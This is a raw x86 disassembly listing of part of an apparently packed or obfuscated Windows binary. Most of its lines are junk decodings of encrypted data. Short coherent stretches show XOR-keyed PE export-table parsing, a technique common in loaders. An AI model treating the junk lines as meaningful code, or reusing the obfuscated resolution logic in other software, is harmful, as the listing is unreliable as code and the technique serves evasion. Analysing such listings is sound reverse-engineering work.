  408c79:	jge    0x408c61
  408c7b:	nop
  408c7c:	mov    cl,0xb4
  408c7e:	xchg   ebp,eax
  408c7f:	add    ecx,DWORD PTR [eax]
  408c81:	pusha  
  408c82:	cmp    bh,BYTE PTR [edx+ebx*8]
  408c85:	repnz and edi,esp
  408c88:	add    al,0xab
  408c8a:	out    0x6,al
  408c8c:	ror    BYTE PTR [eax+0x3a5c73e3],0x9
  408c93:	sbb    DWORD PTR [eax],0xe5dabb8c
  408c99:	and    ebx,ebx
  408c9b:	cmp    ebx,esp
  408c9d:	lock sub al,0x60
  408ca0:	sub    ebp,DWORD PTR [eax]
  408ca2:	mov    DWORD PTR [ecx],ecx
  408ca4:	jl     0x408cb1
  408ca6:	repz (bad) 
  408ca8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ca9:	xchg   ecx,eax
  408caa:	int3   
  408cab:	and    eax,0x6f620645
  408cb0:	xor    eax,0x69ac901a
  408cb5:	in     eax,dx
  408cb6:	das    
  408cb7:	(bad)  
  408cb8:	hlt    
  408cb9:	(bad)  
  408cbb:	sub    esp,eax
  408cbd:	mov    al,0x6c
  408cbf:	adc    edx,DWORD PTR [esi-0x7e]
  408cc2:	sbb    eax,0x96116c96
  408cc7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408cc8:	daa    
  408cc9:	lock pop edx
  408ccb:	dec    edx
  408ccc:	loope  0x408d2f
  408cce:	xchg   edi,eax
  408ccf:	test   eax,0x719ebc39
  408cd4:	mov    ah,0x61
  408cd6:	pop    ecx
  408cd7:	inc    eax
  408cd8:	sbb    al,0xd3
  408cda:	inc    ebx
  408cdb:	push   eax
  408cdc:	das    
  408cdd:	cwde   
  408cde:	enter  0x52e2,0x3f
  408ce2:	jo     0x408d4d
  408ce4:	add    DWORD PTR [ecx],edi
  408ce6:	inc    ebp
  408ce7:	retf   0xdcd5
  408cea:	push   edi
  408ceb:	inc    edi
  408cec:	stc    
  408ced:	clc    
  408cee:	aas    
  408cef:	dec    ecx
  408cf0:	pop    esp
  408cf1:	and    al,0x16
  408cf3:	fisttp WORD PTR [ecx]
  408cf5:	sub    BYTE PTR [edx+0x51f2b615],ah
  408cfb:	fist   WORD PTR [eax+0x335db667]
  408d01:	sbb    edi,ebx
  408d03:	retf   
  408d04:	adc    eax,0xfa63cd34
  408d09:	mov    esp,DWORD PTR [ebx+0x13389fa0]
  408d0f:	inc    esp
  408d10:	test   BYTE PTR [esi-0x66fbec8],0x59
  408d17:	push   cs
  408d18:	icebp  
  408d19:	jns    0x408cbd
  408d1b:	and    ah,BYTE PTR [esi+0x385cc7b2]
  408d21:	daa    
  408d22:	add    al,0x8b
  408d24:	rcr    DWORD PTR [ebp+0x11],cl
  408d27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d28:	and    ch,BYTE PTR [esi]
  408d2a:	ficomp WORD PTR [ebp+esi*2-0x1642806]
  408d31:	mov    esi,DWORD PTR [edi+0x55]
  408d34:	sub    ebp,DWORD PTR [ebx]
  408d36:	mov    bh,0x91
  408d38:	fwait
  408d39:	xchg   ebp,eax
  408d3a:	sub    DWORD PTR [edx+ebx*4],eax
  408d3d:	xchg   esi,eax
  408d3e:	sub    BYTE PTR [edx-0x4c69f838],ah
  408d44:	pop    ds
  408d45:	sub    DWORD PTR [eax],esp
  408d47:	rcl    BYTE PTR [ebx],0x80
  408d4a:	sbb    DWORD PTR [edx+ecx*4+0x70],eax
  408d4e:	sbb    edx,DWORD PTR [ecx-0x11]
  408d51:	(bad)  
  408d52:	das    
  408d53:	pop    ds
  408d54:	jo     0x408d52
  408d56:	jb     0x408d57
  408d58:	hlt    
  408d59:	mov    dh,BYTE PTR [esi-0x46a24183]
  408d5f:	js     0x408cf5
  408d61:	jge    0x408cff
  408d63:	xchg   esi,eax
  408d64:	neg    BYTE PTR [ebx+0x1c3f5085]
  408d6a:	mov    BYTE PTR [edi-0x3c3d50af],dl
  408d70:	fcomp  st(3)
  408d72:	std    
  408d73:	popf   
  408d74:	retf   
  408d75:	mov    al,ds:0xe2a74188
  408d7a:	xchg   BYTE PTR [ebx+0x4a],al
  408d7d:	js     0x408d83
  408d7f:	les    ecx,FWORD PTR [edx]
  408d81:	add    DWORD PTR [ebp+0x177e5907],ebx
  408d87:	cmp    bh,bl
  408d89:	sbb    cl,BYTE PTR [esi+eiz*8+0x4f]
  408d8d:	push   cs
  408d8e:	push   ds
  408d8f:	xchg   esp,eax
  408d90:	aas    
  408d91:	pop    es
  408d92:	neg    BYTE PTR [edx-0x2]
  408d95:	adc    al,0xfd
  408d97:	in     al,dx
  408d98:	not    BYTE PTR [edx-0x4]
  408d9b:	cli    
  408d9c:	sbb    DWORD PTR [edx+eiz*1+0x4a],0xd3445105
  408da4:	stos   DWORD PTR es:[edi],eax
  408da5:	gs (bad) 
  408da7:	sub    DWORD PTR [edi],esi
  408da9:	gs dec esp
  408dab:	out    dx,eax
  408dac:	dec    eax
  408dad:	mov    edi,0x3da32860
  408db2:	loopne 0x408d63
  408db4:	inc    edx
  408db5:	jmp    0x408d8c
  408db7:	dec    esi
  408db8:	push   0x5f763ac1
  408dbd:	cmp    ah,cl
  408dbf:	mov    edi,0x7dbe6bb9
  408dc4:	add    ebx,0x66
  408dc7:	std    
  408dc8:	ret    
  408dc9:	mov    ecx,0x7691ee2f
  408dce:	push   esi
  408dcf:	dec    eax
  408dd0:	inc    esi
  408dd1:	xchg   cx,ax
  408dd3:	mov    bl,0xff
  408dd5:	scas   al,BYTE PTR es:[edi]
  408dd6:	dec    edi
  408dd7:	repz shr BYTE PTR [esi+eiz*1+0x17083d35],1
  408ddf:	cmp    dl,BYTE PTR [edi-0x13a44448]
  408de5:	dec    edx
  408de6:	cmp    DWORD PTR [esi+0x14],edx
  408de9:	inc    edi
  408dea:	in     eax,0xdf
  408dec:	add    edx,DWORD PTR [eax-0x5a41004d]
  408df2:	int3   
  408df3:	and    bl,BYTE PTR cs:[esi+0x58]
  408df7:	and    DWORD PTR ds:0x7dd7bac6,ecx
  408dfd:	jno    0x408e67
  408dff:	dec    ebx
  408e00:	ror    esi,1
  408e02:	fwait
  408e03:	shl    BYTE PTR [esi],1
  408e05:	cmp    DWORD PTR [edx],ebp
  408e07:	arpl   WORD PTR [ecx-0x45],si
  408e0a:	test   al,0xa3
  408e0c:	jle    0x408e23
  408e0e:	xor    BYTE PTR [ebx],cl
  408e10:	jp     0x408e03
  408e12:	ret    
  408e13:	rdtsc  
  408e15:	aas    
  408e16:	mov    ds:0xa4d8b796,al
  408e1b:	pop    ebx
  408e1c:	xchg   esp,eax
  408e1d:	inc    ax
  408e1f:	fcmovnbe st,st(7)
  408e21:	iret   
  408e22:	test   eax,0x663515b8
  408e27:	mov    eax,DWORD PTR [ebp-0x4]
  408e2a:	movzx  eax,ax
  408e2d:	sub    ecx,edi
  408e2f:	cmp    eax,ecx
  408e31:	mov    eax,DWORD PTR [ebp+0x10]
  408e34:	movzx  ecx,WORD PTR [ebp-0x4]
  408e38:	jg     0x408e4d
  408e3e:	xor    eax,esi
  408e40:	sub    ecx,eax
  408e42:	sub    ecx,edi
  408e44:	mov    WORD PTR [ebp-0x4],cx
  408e48:	jmp    0x408e5a
  408e4d:	xor    eax,esi
  408e4f:	lea    eax,[eax+ecx*1+0x32729b]
  408e56:	mov    WORD PTR [ebp-0x4],ax
  408e5a:	mov    eax,DWORD PTR [ebp-0xc]
  408e5d:	cmp    eax,ebx
  408e5f:	je     0x408e73
  408e65:	mov    eax,DWORD PTR [ebp-0x8]
  408e68:	mov    DWORD PTR [eax],0x60341e89
  408e6e:	jmp    0x409836
  408e73:	mov    eax,DWORD PTR [ebp+0x8]
  408e76:	mov    ecx,DWORD PTR [ebp-0x8]
  408e79:	xor    eax,esi
  408e7b:	add    eax,edi
  408e7d:	cmp    DWORD PTR [ecx],eax
  408e7f:	je     0x409149
  408e85:	mov    ecx,DWORD PTR [ebp-0x14]
  408e88:	mov    eax,DWORD PTR [ebp-0x8]
  408e8b:	mov    eax,DWORD PTR [eax]
  408e8d:	mov    eax,DWORD PTR [eax+0x3c]
  408e90:	lea    ecx,[ecx*8+0x78]
  408e97:	add    eax,ecx
  408e99:	mov    ecx,DWORD PTR [ebp-0x8]
  408e9c:	mov    ecx,DWORD PTR [ecx]
  408e9e:	mov    eax,DWORD PTR [eax+ecx*1]
  408ea1:	mov    DWORD PTR [ebp-0x1c],eax
  408ea4:	mov    eax,DWORD PTR [ebp+0x8]
  408ea7:	jmp    0x4090ee
  408eac:	sbb    al,0x56
  408eae:	aam    0xcf
  408eb0:	je     0x408eff
  408eb2:	and    eax,0xfc4f2b75
  408eb7:	adc    eax,0xb8da7226
  408ebc:	or     al,0xd1
  408ebe:	jle    0x408f3e
  408ec0:	and    al,0x7c
  408ec2:	jle    0x408f42
  408ec4:	sub    al,BYTE PTR ds:0x75ad83c9
  408eca:	hlt    
  408ecb:	jle    0x408e69
  408ecd:	mov    ds:0xe406cf46,eax
  408ed2:	mov    al,ds:0x2e855094
  408ed7:	popa   
  408ed8:	into   
  408ed9:	scas   eax,DWORD PTR es:[edi]
  408eda:	add    edi,DWORD PTR [eax+0x27]
  408edd:	sub    BYTE PTR [esi-0x53ef26e5],al
  408ee3:	mov    ?,WORD PTR [edx-0x51]
  408ee6:	mov    dh,0x79
  408ee8:	jbe    0x408ebd
  408eea:	repnz cli 
  408eec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408eed:	xor    ebp,esp
  408eef:	sbb    ebp,eax
  408ef1:	push   ebp
  408ef2:	pop    ecx
  408ef3:	imul   edx,DWORD PTR [ecx],0x7145dbae
  408ef9:	jnp    0x408f74
  408efb:	cmp    esi,DWORD PTR [eax-0x4]
  408efe:	xor    eax,0xbcb93da2
  408f03:	cmp    eax,0x5448bf36
  408f08:	or     eax,esp
  408f0a:	or     DWORD PTR [eax],esi
  408f0c:	clc    
  408f0d:	pop    edx
  408f0e:	mov    db2,eax
  408f11:	out    0x26,eax
  408f13:	inc    eax
  408f14:	and    BYTE PTR [esi*8-0x20f45f3d],0x69
  408f1c:	mov    ah,0x2e
  408f1e:	pop    ebp
  408f1f:	jp     0x408ec1
  408f21:	xchg   BYTE PTR fs:[eax],ah
  408f24:	push   esi
  408f25:	cli    
  408f26:	(bad)  
  408f27:	je     0x408ed1
  408f29:	cmp    al,0x53
  408f2b:	pop    es
  408f2c:	push   esi
  408f2d:	pop    ss
  408f2e:	and    DWORD PTR [edi],edx
  408f30:	jne    0x408fa5
  408f32:	iret   
  408f33:	mov    ebx,0x37fc6d6b
  408f38:	push   ss
  408f39:	std    
  408f3a:	(bad)  
  408f3b:	sub    eax,0x290449c6
  408f40:	push   ss
  408f41:	out    dx,eax
  408f42:	mov    dh,0x5b
  408f44:	loop   0x408fba
  408f46:	retf   
  408f47:	push   ebx
  408f48:	js     0x408f4b
  408f4a:	adc    BYTE PTR [ebp+0x3f],bl
  408f4d:	div    BYTE PTR [ebx+0x61]
  408f50:	lds    ecx,FWORD PTR [edi]
  408f52:	inc    ecx
  408f53:	sub    BYTE PTR ds:0x543dfb8a,cl
  408f59:	dec    edx
  408f5a:	sub    DWORD PTR [ebx],ecx
  408f5c:	retf   
  408f5d:	test   edx,esi
  408f5f:	pusha  
  408f60:	mov    ecx,0x9cf448d4
  408f65:	jne    0x408f4c
  408f67:	loope  0x408fbc
  408f69:	idiv   DWORD PTR [esi+0x1a]
  408f6c:	call   0x41a4:0x53f728bf
  408f73:	push   edx
  408f74:	les    edx,FWORD PTR [eax+eax*8+0x10]
  408f78:	pop    ebx
  408f79:	pop    ebp
  408f7a:	adc    al,0xe5
  408f7c:	push   ds
  408f7d:	out    0xbb,eax
  408f7f:	dec    edx
  408f80:	sub    ebp,eax
  408f82:	sbb    eax,0x35d94dc8
  408f87:	fisttp WORD PTR [esp+eax*4-0x35]
  408f8b:	xchg   eax,esp
  408f8d:	je     0x408ff9
  408f8f:	mov    edx,0xcdfd19c8
  408f94:	cmp    al,BYTE PTR [edi]
  408f96:	and    ebx,esp
  408f98:	outs   dx,DWORD PTR ds:[esi]
  408f99:	cmc    
  408f9a:	push   0x56dc4618
  408f9f:	das    
  408fa0:	jo     0x408f8d
  408fa2:	cwde   
  408fa3:	lds    cx,DWORD PTR [edx]
  408fa6:	xlat   BYTE PTR cs:[ebx]
  408fa8:	push   0x751942db
  408fad:	mov    ebx,0x7391b9dc
  408fb2:	sbb    DWORD PTR [eax],0x25e50cae
  408fb8:	push   es
  408fb9:	gs ins BYTE PTR es:[edi],dx
  408fbb:	dec    ecx
  408fbc:	jmp    0x4b2b869f
  408fc1:	cli    
  408fc2:	mov    eax,0x24038417
  408fc7:	lock jo 0x408f88
  408fca:	xchg   edx,eax
  408fcb:	fnsetpm(287 only) 
  408fcd:	inc    esi
  408fce:	xchg   BYTE PTR [ebp+ebx*2+0x70],bl
  408fd2:	and    edx,DWORD PTR [ecx-0x7f984300]
  408fd8:	push   ds
  408fd9:	dec    ebp
  408fda:	jb     0x408ff7
  408fdc:	jmp    0x3f83:0x6c6421ae
  408fe3:	mov    ds,WORD PTR [eax+0x30]
  408fe6:	or     eax,0x8e109584
  408feb:	(bad)  
  408fec:	mov    dh,ch
  408fee:	push   cs
  408fef:	jmp    0xb956:0xcda95514
  408ff6:	xor    esp,DWORD PTR [ebx+0x28]
  408ff9:	cmp    BYTE PTR [esi+0x8],0x5d
  408ffd:	jne    0x408fa3
  408fff:	jns    0x409031
  409001:	mov    bh,0x75
  409003:	mov    bh,0xe6
  409005:	repz or ecx,edx
  409008:	loopne 0x408fd8
  40900a:	adc    dl,dl
  40900c:	fwait
  40900d:	sbb    al,0xb2
  40900f:	rcr    DWORD PTR [eax-0xa],cl
  409012:	ror    BYTE PTR [esp+esi*4-0x75],1
  409016:	mov    ecx,0x20586150
  40901b:	(bad)  
  40901c:	and    ecx,edi
  40901e:	xchg   esi,eax
  40901f:	jmp    0x4c6d33a8
  409024:	adc    edx,edx
  409026:	ficom  WORD PTR [eax]
  409028:	push   0xffffff83
  40902a:	imul   eax,edx,0xffffff89
  40902d:	(bad)
  409030:	inc    ecx
  409031:	jmp    0xd8f6538b
  409036:	add    BYTE PTR [ecx+edi*4-0x33],ah
  40903a:	adc    al,0x3d
  40903c:	mov    dl,0x57
  40903e:	push   ds
  40903f:	xor    DWORD PTR [ebp-0x14],ebx
  409042:	ret    
  409043:	add    al,0xfe
  409045:	mov    dh,0x17
  409047:	dec    edi
  409048:	and    ebx,DWORD PTR [ecx+0x7aa53abb]
  40904e:	jnp    0x40908c
  409050:	cmp    DWORD PTR [edi+0x16],esp
  409053:	sub    eax,0x3031e748
  409058:	xchg   esp,eax
  409059:	pop    ds
  40905a:	mov    ebp,0x3f673d82
  40905f:	mov    esp,0x781ab395
  409064:	pop    edx
  409065:	fs pop edi
  409067:	push   ebp
  409068:	fisubr DWORD PTR [ebp-0x3e]
  40906b:	cs mul al
  40906e:	mov    cl,al
  409070:	rol    DWORD PTR [ebp*8-0x1a547e26],0xd4
  409078:	push   esi
  409079:	dec    BYTE PTR [esi-0x62]
  40907c:	scas   al,BYTE PTR es:[edi]
  40907d:	xor    al,0xdf
  40907f:	mov    dh,0x30
  409081:	jbe    0x4090cc
  409083:	mov    al,0xa8
  409085:	xor    ebx,esi
  409087:	pop    esi
  409088:	jae    0x4090f4
  40908a:	out    dx,al
  40908b:	or     al,0x25
  40908d:	pop    ebp
  40908e:	into   
  40908f:	mov    ebx,0x201e7002
  409094:	xor    cl,BYTE PTR [edi]
  409096:	pop    esp
  409097:	fadd   DWORD PTR [esi-0x644e094e]
  40909d:	push   ebx
  40909e:	cmp    eax,0xd90d9a78
  4090a3:	test   eax,0x373950b2
  4090a8:	iret   
  4090a9:	sub    bl,0x5e
  4090ac:	xchg   ebp,eax
  4090ad:	mov    DWORD PTR [esi-0x25],0xa5891934
  4090b4:	and    DWORD PTR [eax+edx*2-0x1fdd53b],ebp
  4090bb:	popf   
  4090bc:	cmp    DWORD PTR [ecx+0x32],esi
  4090bf:	pop    edi
  4090c0:	and    BYTE PTR [eax+0x29],al
  4090c3:	push   eax
  4090c4:	into   
  4090c5:	(bad)  
  4090c6:	retf   
  4090c7:	pop    ss
  4090c8:	ss lahf 
  4090ca:	inc    ebp
  4090cb:	mov    al,ds:0xb4c44cc0
  4090d0:	fist   DWORD PTR [edi+0x3f]
  4090d3:	in     eax,0xb5
  4090d5:	rcl    DWORD PTR fs:[ecx-0x7e],cl
  4090d9:	and    al,0xaf
  4090db:	mov    ds:0x43208e64,al
  4090e0:	xchg   sp,ax
  4090e2:	das    
  4090e3:	imul   esp,DWORD PTR [eax],0xffffffff
  4090e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4090e7:	icebp  
  4090e8:	je     0x409152
  4090ea:	cmp    BYTE PTR [ecx],dh
  4090ec:	repnz xor eax,0xc703c633
  4090f2:	mov    DWORD PTR [ebp-0x20],eax
  4090f5:	mov    eax,DWORD PTR [ebp+0x8]
  4090f8:	mov    ecx,DWORD PTR [ebp-0x1c]
  4090fb:	xor    eax,esi
  4090fd:	add    eax,edi
  4090ff:	cmp    ecx,eax
  409101:	je     0x409836
  409107:	mov    eax,DWORD PTR [ebp-0x8]
  40910a:	mov    ecx,DWORD PTR [ebp-0x1c]
  40910d:	add    ecx,DWORD PTR [eax]
  40910f:	mov    DWORD PTR [ebp-0x20],ecx
  409112:	mov    eax,DWORD PTR [ebp-0x20]
  409115:	mov    ecx,DWORD PTR [ebp-0x8]
  409118:	mov    eax,DWORD PTR [eax+0xc]
  40911b:	mov    ecx,DWORD PTR [ecx]
  40911d:	mov    al,BYTE PTR [eax+ecx*1]
  409120:	add    al,0x38
  409122:	xor    al,0x46
  409124:	cmp    al,0xc5
  409126:	je     0x40913d
  40912c:	mov    eax,DWORD PTR [ebp+0x8]
  40912f:	mov    ecx,DWORD PTR [ebp-0x8]
  409132:	xor    eax,esi
  409134:	add    eax,edi
  409136:	mov    DWORD PTR [ecx],eax
  409138:	jmp    0x409836
  40913d:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  409144:	jmp    0x409836
  409149:	mov    eax,DWORD PTR [ebp-0x8]
  40914c:	mov    ecx,DWORD PTR [ebp-0x18]
  40914f:	mov    ecx,DWORD PTR [ecx]
  409151:	jmp    0x409398
  409156:	sbb    eax,0xe1aec100
  40915b:	outs   dx,DWORD PTR ds:[esi]
  40915c:	jno    0x4090ef
  40915e:	out    dx,al
  40915f:	jne    0x4090f6
  409161:	mov    bh,0x7d
  409163:	jno    0x409199
  409165:	mov    edi,0x7e7edf32
  40916a:	and    al,0x7c
  40916c:	jle    0x4091ec
  40916e:	shl    BYTE PTR [edx+0x1c],1
  409171:	inc    edx
  409172:	add    esp,ebp
  409174:	xchg   BYTE PTR ds:0xde2acc07,ah
  40917a:	sub    DWORD PTR [edx+0x64],esp
  40917d:	leave  
  40917e:	jle    0x40913a
  409180:	dec    eax
  409181:	hlt    
  409182:	mov    ebp,DWORD PTR [eax+0x30]
  409185:	cli    
  409186:	sbb    al,0xfb
  409188:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409189:	pusha  
  40918a:	stos   DWORD PTR es:[edi],eax
  40918b:	pop    ss
  40918c:	scas   al,BYTE PTR es:[edi]
  40918d:	ret    
  40918e:	leave  
  40918f:	outs   dx,DWORD PTR gs:[esi]
  409191:	shl    ah,cl
  409193:	shl    DWORD PTR [esi-0x19],cl
  409196:	int    0x1e
  409198:	scas   al,BYTE PTR es:[edi]
  409199:	push   edx
  40919b:	cmp    BYTE PTR [ecx+esi*1+0x6c],cl
  40919f:	mov    ebx,0xb208871d
  4091a4:	out    dx,eax
  4091a5:	(bad)  
  4091a6:	push   eax
  4091a7:	jl     0x409186
  4091a9:	lods   al,BYTE PTR ds:[esi]
  4091aa:	xor    DWORD PTR [esi-0x9],0x12
  4091ae:	xlat   BYTE PTR ds:[ebx]
  4091af:	sub    esp,ebp
  4091b1:	mov    al,ds:0x1296c192
  4091b6:	std    
  4091b7:	aam    0x2
  4091b9:	cmp    al,0xe5
  4091bb:	out    dx,eax
  4091bc:	lea    ebp,[edi+0x14]
  4091bf:	push   es
  4091c0:	mov    dl,0x15
  4091c2:	aam    0x9d
  4091c4:	data16 sahf 
  4091c6:	jmp    DWORD PTR [eax+esi*1+0x55b2db66]
  4091cd:	(bad)  
  4091ce:	cmp    esp,DWORD PTR [ebp+0x73bbfb07]
  4091d4:	fdiv   DWORD PTR [ebx+0x7b]
  4091d7:	out    0x64,al
  4091d9:	push   0xffffffca
  4091db:	nop
  4091dc:	fsubr  DWORD PTR [ebx]
  4091de:	inc    ebx
  4091df:	sub    al,0xff
  4091e1:	push   cs
  4091e2:	repz pop esp
  4091e4:	fwait
  4091e5:	repnz cwde 
  4091e7:	mov    BYTE PTR [eax],dh
  4091e9:	push   eax
  4091ea:	xor    DWORD PTR [edi-0x7bd671fd],esi
  4091f0:	mov    dh,0x9a
  4091f2:	sub    bh,bl
  4091f4:	shr    ch,cl
  4091f6:	xchg   edx,eax
  4091f7:	mov    ds:0x575ea55,eax
  4091fc:	adc    bl,dl
  4091fe:	loop   0x409185
  409200:	push   esp
  409201:	push   esi
  409202:	enter  0xbf13,0x3d
  409206:	fist   DWORD PTR [esi+0x4ee61dc8]
  40920c:	sbb    BYTE PTR [ebx+0x72],bh
  40920f:	(bad)  
  409210:	sbb    eax,0x299bb44a
  409215:	xchg   esp,eax
  409216:	(bad)  
  409218:	shl    BYTE PTR [ebp+0x656ad9d4],cl
  40921e:	test   eax,0xd2053b74
  409223:	jle    0x4091e0
  409225:	inc    cx
  409227:	jmp    0x1757b10f
  40922c:	into   
  40922d:	dec    edi
  40922e:	lds    ebp,FWORD PTR [ecx+0x71543a95]
  409234:	sbb    BYTE PTR [ecx+0x2b],dl
  409237:	jg     0x4091d8
  409239:	imul   edi,DWORD PTR [ebp+0xe],0xc4af37ad
  409240:	jnp    0x40929f
  409242:	lea    ebx,[eax+0x65c0762]
  409248:	jae    0x409209
  40924a:	ret    
  40924b:	inc    DWORD PTR [eax-0x23267e5c]
  409251:	pop    eax
  409252:	add    edi,DWORD PTR [esi+0x69]
  409255:	fmul   QWORD PTR [eax+0x4a]
  409258:	fbld   TBYTE PTR [ebp+0x4]
  40925b:	dec    ecx
  40925c:	jecxz  0x4091ff
  40925e:	ins    DWORD PTR es:[edi],dx
  40925f:	sub    al,0x2e
  409261:	in     al,0x38
  409263:	clc    
  409264:	and    edx,esp
  409266:	jmp    0xaa16:0x4491bc3f
  40926d:	lock add bl,dl
  409270:	lahf   
  409271:	loopne 0x40926a
  409273:	xlat   BYTE PTR ds:[ebx]
  409274:	out    dx,eax
  409275:	jno    0x409229
  409277:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409278:	(bad)  [ebp-0x45f4f7c6]
  40927e:	push   cs
  40927f:	fwait
  409280:	mov    ebp,0x493924db
  409285:	jae    0x4092fc
  409287:	push   0xffffff82
  409289:	lock mov bl,0xb3
  40928c:	push   esi
  40928d:	cmp    al,0xa8
  40928f:	dec    esi
  409290:	or     BYTE PTR [edx-0x50],ah
  409293:	inc    edi
  409294:	xor    BYTE PTR [ecx-0x64f5e930],bl
  40929a:	or     DWORD PTR [edi],esi
  40929c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40929d:	fs pop edx
  40929f:	(bad)  
  4092a0:	mov    ah,0x10
  4092a2:	rol    dl,0x86
  4092a5:	loop   0x409270
  4092a7:	ret    0x3113
  4092aa:	addr16 mov edi,0x13784279
  4092b0:	cmp    BYTE PTR [ecx-0x14ffe564],ch
  4092b6:	xor    al,0x73
  4092b8:	jbe    0x4092bb
  4092ba:	cli    
  4092bb:	mov    DWORD PTR [ebx-0x36],esp
  4092be:	daa    
  4092bf:	dec    esi
  4092c0:	mov    al,dh
  4092c2:	and    DWORD PTR [eax+0x2c],esi
  4092c5:	bound  ebx,QWORD PTR [ebp+0x15]
  4092c8:	sbb    DWORD PTR [esi-0x2acb4d95],edx
  4092ce:	out    0x62,al
  4092d0:	clc    
  4092d1:	int    0xf9
  4092d3:	or     BYTE PTR [eax+0x31],cl
  4092d6:	mov    ah,0xb5
  4092d8:	cli    
  4092d9:	xchg   ebx,eax
  4092da:	jne    0x4092c9
  4092dc:	mov    ecx,0x78bd1d17
  4092e1:	inc    ebx
  4092e2:	xchg   edi,eax
  4092e3:	mov    ecx,0x8df00036
  4092e8:	ror    DWORD PTR [edi-0x23],1
  4092eb:	xchg   BYTE PTR [esi+0x7f],al
  4092ee:	mov    ecx,DWORD PTR [ecx+0x79cc8b4e]
  4092f4:	cdq    
  4092f5:	add    DWORD PTR ds:0x25b3509c,0xfffffffa
  4092fc:	push   esp
  4092fd:	addr16 daa 
  4092ff:	lahf   
  409300:	jle    0x409327
  409302:	out    dx,al
  409303:	or     al,0xad
  409305:	xchg   BYTE PTR [ebp+0xd460586],dh
  40930b:	retf   
  40930c:	jge    0x4092db
  40930e:	jmp    0x922eb7b7
  409313:	(bad)  
  409314:	shr    edi,cl
  409316:	sbb    eax,0x5a5d982
  40931b:	pusha  
  40931c:	mov    edx,DWORD PTR [ebx]
  40931e:	loop   0x409335
  409320:	add    BYTE PTR [edx+edi*1],bh
  409323:	fdiv   QWORD PTR [eax+0x6d]
  409326:	push   edi
  409327:	and    DWORD PTR [ebp+0x49],eax
  40932a:	jmp    0xcb1a:0x9d63f3c9
  409331:	push   cs
  409332:	jb     0x4092c8
  409334:	call   0x3694:0x8fcc36b2
  40933b:	mov    ebp,0x64f367eb
  409340:	ja     0x4093b7
  409342:	push   ds
  409343:	test   di,si
  409346:	jp     0x409360
  409348:	(bad)  
  409349:	mov    bh,0x13
  40934b:	xlat   BYTE PTR ds:[ebx]
  40934c:	inc    esi
  40934d:	dec    esi
  40934e:	dec    ebx
  40934f:	mov    ecx,DWORD PTR [ebx+0x1d]
  409352:	lods   eax,DWORD PTR ds:[esi]
  409353:	push   ss
  409354:	sbb    DWORD PTR [ecx+edi*4],esp
  409357:	push   edi
  409358:	add    ebx,edx
  40935a:	xchg   DWORD PTR [edi-0x75],edi
  40935d:	sbb    al,0x3c
  40935f:	pop    esp
  409360:	xchg   esi,eax
  409361:	sbb    bl,0x1d
  409364:	les    ecx,FWORD PTR [esi]
  409366:	outs   dx,DWORD PTR ds:[esi]
  409367:	push   ss
  409368:	ja     0x409394
  40936a:	jle    0x4093dc
  40936c:	imul   esi,DWORD PTR [esi-0x5d],0xeee78c8c
  409373:	sub    bl,BYTE PTR [edi-0x50355783]
  409379:	push   ebx
  40937a:	lds    ebp,FWORD PTR [ebx-0x3588843c]
  409380:	cmp    bl,bh
  409382:	call   0xdfbf:0x91ec054a
  409389:	cmp    DWORD PTR [ebx-0x11fedfe2],ebx
  40938f:	mov    al,ds:0x86022d1c
  409394:	std    
  409395:	fs mov edx,0x8b088928
  40939b:	inc    ebp
  40939c:	or     al,0x8b
  40939e:	inc    ebp
  40939f:	or     bh,bh
  4093a1:	jne    0x40939b
  4093a3:	jmp    0x4095ea
  4093a8:	lods   eax,DWORD PTR ds:[esi]
  4093a9:	mov    dl,0xfe
  4093ab:	outs   dx,BYTE PTR ds:[esi]
  4093ac:	xor    DWORD PTR [edx+0x6d],0x15d7aa71
  4093b3:	pop    edi
  4093b4:	shl    DWORD PTR [ecx+0xd],0xe2
  4093b8:	fcomp  st(5)
  4093ba:	jle    0x40943a
  4093bc:	and    al,0x7c
  4093be:	jle    0x40943e
  4093c0:	ficomp DWORD PTR [edx+edi*4]
  4093c3:	lock out 0x8,eax
  4093c6:	cmp    esi,ecx
  4093c8:	cmp    al,0x74
  4093ca:	ret    
  4093cb:	mov    eax,ds:0x7457f0cc
  4093d0:	ja     0x4093b9
  4093d2:	and    BYTE PTR [edx+0x5ae10a46],cl
  4093d8:	es pushf 
  4093da:	jne    0x409400
  4093dc:	or     DWORD PTR [esi+0x60],edx
  4093df:	sar    DWORD PTR [edx],1
  4093e1:	fcomi  st,st(7)
  4093e3:	mov    al,ds:0xb8d6cb
  4093e8:	stos   DWORD PTR es:[edi],eax
  4093e9:	pop    ecx
  4093ea:	imul   edx,DWORD PTR [ecx],0xffffffde
  4093ed:	and    ah,cl
  4093ef:	iret   
  4093f0:	mov    fs,WORD PTR [ebx-0x5f]
  4093f3:	(bad)  
  4093f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4093f5:	mov    al,0x32
  4093f7:	or     al,0x6a
  4093f9:	dec    ebp
  4093fa:	adc    BYTE PTR ss:[ebx-0x57b86e77],0x5b
  409402:	test   al,0xd4
  409404:	test   al,0xa2
  409406:	jns    0x40940a
  409408:	push   ds
  409409:	push   es
  40940a:	add    eax,0x62852116
  40940f:	and    eax,0x101bf5ea
  409414:	jb     0x4093df
  409416:	mov    al,ds:0xcbe2977f
  40941b:	ror    dh,1
  40941d:	das    
  40941e:	mov    DWORD PTR [ebx+0x7dcb7fe2],eax
  409424:	cli    
  409425:	inc    ebx
  409426:	cmp    esp,DWORD PTR [esi-0x74]
  409429:	inc    ebp
  40942a:	inc    ebx
  40942b:	mov    ah,0x40
  40942d:	add    eax,0xd128f9af
  409432:	les    ebp,FWORD PTR [esi+ecx*8+0x4d]
  409436:	pushf  
  409437:	int    0x28
  409439:	add    ecx,DWORD PTR gs:[edx]
  40943c:	xor    eax,0x633c0819
  409441:	sub    al,0x1
  409443:	lock xor ah,BYTE PTR [ebp+0x16373360]
  40944a:	mov    DWORD PTR [esi],esp
  40944c:	xor    esp,edx
  40944e:	adc    bh,bl
  409450:	mov    bl,0xec
